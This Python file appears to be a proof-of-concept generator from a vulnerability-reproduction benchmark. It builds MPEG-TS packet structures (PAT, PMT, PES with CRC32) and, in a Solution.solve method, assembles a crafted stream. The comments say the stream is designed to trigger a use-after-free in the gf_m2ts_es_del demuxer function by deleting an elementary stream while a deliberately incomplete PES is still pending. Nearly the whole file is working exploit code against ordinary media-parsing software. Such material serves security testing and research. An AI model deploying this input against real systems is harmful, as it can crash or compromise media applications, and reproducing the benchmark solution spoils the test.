import struct
from typing import List, Tuple, Dict
from collections import defaultdict

def crc32_mpeg2(data: bytes) -> int:
    crc = 0xFFFFFFFF
    poly = 0x04C11DB7
    for b in data:
        crc ^= (b << 24) & 0xFFFFFFFF
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF

def build_pat_section(tsid: int, program_map_pid: int, version: int = 0) -> bytes:
    table_id = 0x00
    section_syntax_indicator = 1
    reserved = 0x03
    section_length = 5 + 4 + 4  # header (5) + one program (4) + CRC (4)
    b0 = table_id
    b1 = (section_syntax_indicator << 7) | (0 << 6) | (reserved << 4) | ((section_length >> 8) & 0x0F)
    b2 = section_length & 0xFF
    # transport_stream_id
    tsid_hi = (tsid >> 8) & 0xFF
    tsid_lo = tsid & 0xFF
    # version, current_next
    ver_cn = (0x03 << 6) | ((version & 0x1F) << 1) | 1
    section_number = 0x00
    last_section_number = 0x00
    # program entry: program_number + PID
    program_number = 0x0001
    pn_hi = (program_number >> 8) & 0xFF
    pn_lo = program_number & 0xFF
    pmt_pid_hi = 0xE0 | ((program_map_pid >> 8) & 0x1F)
    pmt_pid_lo = program_map_pid & 0xFF
    body = bytes([
        b0, b1, b2,
        tsid_hi, tsid_lo,
        ver_cn,
        section_number,
        last_section_number,
        pn_hi, pn_lo,
        pmt_pid_hi, pmt_pid_lo
    ])
    crc = crc32_mpeg2(body)
    crc_bytes = struct.pack(">I", crc)
    return body + crc_bytes

def build_pmt_section(program_number: int, pcr_pid: int, es_list: List[Tuple[int, int]], version: int = 0) -> bytes:
    table_id = 0x02
    section_syntax_indicator = 1
    reserved = 0x03
    # base length without CRC and ES loop: 9 bytes after section_length
    # program_info_length = 0
    program_info_length = 0
    es_len_total = 0
    for stream_type, pid in es_list:
        es_len_total += 5  # type(1) + elem_pid(2) + es_info_length(2)
    section_length = 9 + program_info_length + es_len_total + 4  # +CRC(4)
    b0 = table_id
    b1 = (section_syntax_indicator << 7) | (0 << 6) | (reserved << 4) | ((section_length >> 8) & 0x0F)
    b2 = section_length & 0xFF
    prog_hi = (program_number >> 8) & 0xFF
    prog_lo = program_number & 0xFF
    ver_cn = (0x03 << 6) | ((version & 0x1F) << 1) | 1
    section_number = 0x00
    last_section_number = 0x00
    pcr_pid_hi = 0xE0 | ((pcr_pid >> 8) & 0x1F)
    pcr_pid_lo = pcr_pid & 0xFF
    prog_info_len_hi = 0xF0 | ((program_info_length >> 8) & 0x0F)
    prog_info_len_lo = program_info_length & 0xFF
    header = bytes([
        b0, b1, b2,
        prog_hi, prog_lo,
        ver_cn,
        section_number,
        last_section_number,
        pcr_pid_hi, pcr_pid_lo,
        prog_info_len_hi, prog_info_len_lo
    ])
    es_bytes = bytearray()
    for stream_type, pid in es_list:
        es_pid_hi = 0xE0 | ((pid >> 8) & 0x1F)
        es_pid_lo = pid & 0xFF
        es_info_len_hi = 0xF0 | 0  # es_info_length = 0
        es_info_len_lo = 0x00
        es_bytes += bytes([stream_type, es_pid_hi, es_pid_lo, es_info_len_hi, es_info_len_lo])
    body = header + bytes(es_bytes)
    crc = crc32_mpeg2(body)
    crc_bytes = struct.pack(">I", crc)
    return body + crc_bytes

def encode_pts_only(pts: int) -> bytes:
    # PTS only, '0010' prefix
    b0 = ((0x2 << 4) | (((pts >> 30) & 0x07) << 1) | 1) & 0xFF
    b1 = ((pts >> 22) & 0xFF)
    b2 = (((pts >> 15) & 0x7F) << 1 | 1) & 0xFF
    b3 = ((pts >> 7) & 0xFF)
    b4 = (((pts & 0x7F) << 1) | 1) & 0xFF
    return bytes([b0, b1, b2, b3, b4])

def build_pes_packet(stream_id: int, payload: bytes, pts: int = 1, declare_len: int = None) -> bytes:
    # Build MPEG-2 PES with PTS only header
    start_code_prefix = b'\x00\x00\x01'
    flags1 = 0x80  # '10' marker
    pts_flags = 0x80  # PTS only
    pts_bytes = encode_pts_only(pts)
    header_data_length = len(pts_bytes)
    header_rest = bytes([flags1, pts_flags, header_data_length]) + pts_bytes
    # PES_packet_length is the number of bytes following this field in the PES packet
    # i.e., len(header_rest) + len(payload)
    if declare_len is None:
        pes_packet_length = len(header_rest) + len(payload)
    else:
        pes_packet_length = declare_len
    pes_len_bytes = struct.pack(">H", pes_packet_length)
    pes = start_code_prefix + bytes([stream_id]) + pes_len_bytes + header_rest + payload
    return pes

def ts_header(pid: int, pusi: int, cc: int, adaptation: int = 1, scrambling: int = 0, priority: int = 0, tei: int = 0) -> bytes:
    b0 = 0x47
    b1 = ((tei & 1) << 7) | ((pusi & 1) << 6) | ((priority & 1) << 5) | ((pid >> 8) & 0x1F)
    b2 = pid & 0xFF
    b3 = ((scrambling & 0x3) << 6) | ((adaptation & 0x3) << 4) | (cc & 0x0F)
    return bytes([b0, b1, b2, b3])

def pack_psi_packet(pid: int, section: bytes, cc_map: Dict[int, int]) -> bytes:
    # Single-packet PSI with pointer_field=0
    payload = bytes([0x00]) + section  # pointer_field
    # adaptation_field_control: '01' (payload only)
    cc = cc_map[pid] & 0x0F
    header = ts_header(pid, pusi=1, cc=cc, adaptation=1)
    cc_map[pid] = (cc + 1) & 0x0F
    # payload space is 184 bytes
    payload_space = 184
    if len(payload) > payload_space:
        # Should not happen with our small sections
        payload = payload[:payload_space]
    stuffing = bytes([0xFF] * (payload_space - len(payload)))
    return header + payload + stuffing

def pack_pes_packet_single_ts(pid: int, pes: bytes, cc_map: Dict[int, int], pusi: int = 1) -> bytes:
    # Single TS packet with part (or all) of a PES
    # For PES, if PUSI=1, payload starts immediately with PES bytes (no pointer_field)
    payload_space = 184
    payload = pes[:payload_space]
    cc = cc_map[pid] & 0x0F
    header = ts_header(pid, pusi=pusi, cc=cc, adaptation=1)
    cc_map[pid] = (cc + 1) & 0x0F
    stuffing = bytes([0xFF] * (payload_space - len(payload)))
    return header + payload + stuffing

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a crafted MPEG-TS designed to manipulate PMT/ES lifecycle to hit gf_m2ts_es_del UAF
        # Sequence:
        # 1) PAT -> PMT with ES PID 0x0101
        # 2) Start incomplete PES on PID 0x0101 (keeps ES active with pending PES)
        # 3) PMT update removing ES PID 0x0101 (triggers gf_m2ts_es_del while PES is pending)
        # 4) Optionally, another PMT reiteration (to increase reliability)
        cc_map = defaultdict(int)

        # 1) PAT
        pat_section = build_pat_section(tsid=1, program_map_pid=0x0100, version=0)
        pat_pkt = pack_psi_packet(pid=0x0000, section=pat_section, cc_map=cc_map)

        # 2) PMT with one ES: video PID 0x0101 (stream_type 0x1B H.264)
        pmt1_section = build_pmt_section(program_number=1, pcr_pid=0x0101, es_list=[(0x1B, 0x0101)], version=0)
        pmt1_pkt = pack_psi_packet(pid=0x0100, section=pmt1_section, cc_map=cc_map)

        # 3) Incomplete PES on PID 0x0101
        # Build a PES that declares length larger than provided bytes so demux keeps it pending
        pes_payload = b'\x00' * 20  # small payload
        declared_len = 64  # declare more than actual header+payload to keep pending
        pes = build_pes_packet(stream_id=0xE0, payload=pes_payload, pts=1, declare_len=declared_len)
        pes_pkt = pack_pes_packet_single_ts(pid=0x0101, pes=pes, cc_map=cc_map, pusi=1)

        # 4) PMT update removing ES PID 0x0101 (PCR_PID changed to 0x1FFF and no ES entries)
        pmt2_section = build_pmt_section(program_number=1, pcr_pid=0x1FFF, es_list=[], version=1)
        pmt2_pkt = pack_psi_packet(pid=0x0100, section=pmt2_section, cc_map=cc_map)

        # Optional: Send another PMT reiteration to reinforce state changes (same as pmt2)
        pmt3_section = build_pmt_section(program_number=1, pcr_pid=0x1FFF, es_list=[], version=2)
        pmt3_pkt = pack_psi_packet(pid=0x0100, section=pmt3_section, cc_map=cc_map)

        # Combine packets
        ts_stream = pat_pkt + pmt1_pkt + pes_pkt + pmt2_pkt + pmt3_pkt

        return ts_stream
